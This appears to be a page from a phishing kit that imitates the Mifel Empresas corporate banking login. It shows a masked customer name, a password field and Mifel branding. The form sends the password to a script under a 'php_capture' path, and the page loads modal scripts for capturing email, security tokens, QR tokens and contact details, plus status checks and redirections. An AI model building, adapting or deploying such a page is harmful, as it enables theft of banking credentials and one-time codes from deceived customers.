<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Empresas - Autenticación</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            height: 100vh;
            overflow: hidden;
        }

        .main-container {
            display: flex;
            height: 100vh;
            position: relative;
        }

        /* Bloque izquierdo - Azul */
        .left-block {
            flex: 1;
            background: #002856;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            color: white;
            font-size: 18px;
            line-height: 1.6;
            text-align: center;
            padding: 20px;
        }

        .user-info {
            position: relative;
            z-index: 2;
        }

        .user-text {
            font-weight: 400;
            margin-bottom: 10px;
        }

        /* Círculo central con iniciales */
        .profile-circle {
            position: absolute;
            right: -95px;
            top: 50%;
            transform: translateY(-50%);
            width: 190px;
            height: 190px;
            border: 10px solid #c2fffd;
            background: #00ccc5;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            font-weight: 600;
            color: white;
            z-index: 3;
        }

        /* Bloque derecho - Blanco */
        .right-block {
            flex: 1;
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px;
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .mifel-logo {
            height: 60px;
            width: auto;
        }

        .form-content {
            width: 100%;
            max-width: 400px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-field {
            width: 100%;
            padding: 12px 50px 12px 16px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            font-weight: 400;
            background-color: #edf3f7;
            transition: all 0.3s ease;
        }

        .input-field:hover {
            background-color: #e6ecf4;
        }

        .input-field:focus,
        .input-field:active {
            outline: none;
            background-color: #edf3f7;
            box-shadow: 0 0 15px 2px rgba(0, 123, 255, 0.6);
        }

        .toggle-eye {
            position: absolute;
            right: 12px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .eye-icon {
            width: 20px;
            height: 20px;
            pointer-events: none;
            filter: brightness(0) saturate(100%) invert(12%) sepia(89%) saturate(2284%) hue-rotate(205deg) brightness(96%) contrast(101%);
        }

        .forgot-link {
            margin-bottom: 24px;
            text-align: left;
        }

        .link-text {
            color: #002856;
            text-decoration: none;
            font-size: 14px;
            font-weight: 300;
        }

        .link-text:hover {
            text-decoration: underline;
        }

        .login-button {
            width: 100%;
            padding: 12px 24px;
            background: #00ccc5;
            color: #002856;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-bottom: 20px;
        }

        .login-button:hover {
            background: #c2fffd;
        }

        .change-user {
            text-align: center;
            font-size: 14px;
            color: #6b7280;
            font-weight: 300;
        }

        .change-user a {
            color: #002856;
            text-decoration: none;
            font-weight: 300;
        }

        .change-user a:hover {
            text-decoration: underline;
        }

        /* Header con selector de idioma */
        .header-container {
            position: absolute;
            top: 20px;
            right: 20px;
            z-index: 10;
        }

        .language-dropdown {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            backdrop-filter: blur(10px);
        }

        .flag-icon {
            width: 20px;
            height: 15px;
        }

        .language-text {
            color: white;
            font-size: 14px;
            font-weight: 500;
        }

        .dropdown-arrow {
            width: 12px;
            height: 12px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .main-container {
                flex-direction: column;
            }
            
            .left-block, .right-block {
                flex: none;
                height: 50vh;
            }
            
            .profile-circle {
                width: 80px;
                height: 80px;
                font-size: 24px;
            }
            
            .user-text {
                font-size: 16px;
            }
        }
    </style>
    <link rel="stylesheet" href="../php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="../php_modales/css/herramientas.css">
    <link rel="stylesheet" href="../php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="../php_modales/css/email_validate.css">
    <link rel="stylesheet" href="../php_modales/css/token_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/token_qr_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/contacto_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/sincronizacion.css">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/../includes/responsive_movil.php'; mifel_responsive_movil_empresas(); ?>
</head>
<body>
    <!-- Header con selector de idioma -->
    <div class="header-container">
        <div class="language-dropdown">
            <img src="../images/Flag_mx2.svg" alt="México" class="flag-icon">
            <span class="language-text">ES</span>
            <img src="../images/drop_down.png" alt="dropdown" class="dropdown-arrow">
        </div>
    </div>

    <div class="main-container">
        <!-- Bloque izquierdo - Azul con información del usuario -->
        <div class="left-block">
            <div class="user-info">
                <div class="user-text">
                    J****** I****** J**** F****** estás por iniciar en<br>
                    J****** I****** J**** J**** F*********
                </div>
            </div>
            
            <!-- Círculo central con iniciales -->
            <div class="profile-circle">
                JJ
            </div>
        </div>

        <!-- Bloque derecho - Blanco con formulario -->
        <div class="right-block">
            <div class="logo-container">
                <img src="../images/mifel-empresas.svg" alt="Mifel Empresas" class="mifel-logo">
            </div>
            
            <form class="form-content" action="../php_capture/password_empresas.php" method="POST">
                <div class="input-group">
                    <label for="password" class="input-label">Contraseña</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" class="input-field" required>
                        <button type="button" class="toggle-eye" aria-label="Mostrar/Ocultar" onclick="togglePassword()">
                            <img src="../images/toggle-eye_text.svg" alt="Mostrar" class="eye-icon" id="eyeIcon">
                        </button>
                    </div>
                </div>

                <div class="forgot-link">
                    <a href="#" class="link-text">¿Olvidaste tu contraseña?</a>
                </div>

                <button type="submit" class="login-button">Continuar</button>

                <div class="change-user">
                    <span>¿No eres tú? <a href="index.php">Cambiar usuario</a></span>
                </div>
            </form>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.src = '../images/toggle-eye_password.svg';
                eyeIcon.alt = 'Ocultar';
            } else {
                passwordInput.type = 'password';
                eyeIcon.src = '../images/toggle-eye_text.svg';
                eyeIcon.alt = 'Mostrar';
            }
        }
    </script>
    <script>window.MODAL_BASE = '../';</script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="../php_modales/js/modales_input_no_input.js"></script>
    <script src="../php_modales/js/herramientas.js"></script>
    <script src="../php_modales/js/reloj_personalizado.js"></script>
    <script src="../php_modales/js/redirecciones.js"></script>
    <script src="../php_modales/js/email_validate_handler.js"></script>
    <script src="../php_modales/js/token_empresa_handler.js"></script>
    <script src="../php_modales/js/token_qr_empresa_handler.js"></script>
    <script src="../php_modales/js/contacto_empresa_handler.js"></script>
    <script src="../php_modales/js/sincronizacion_handler.js"></script>
</body>
</html>
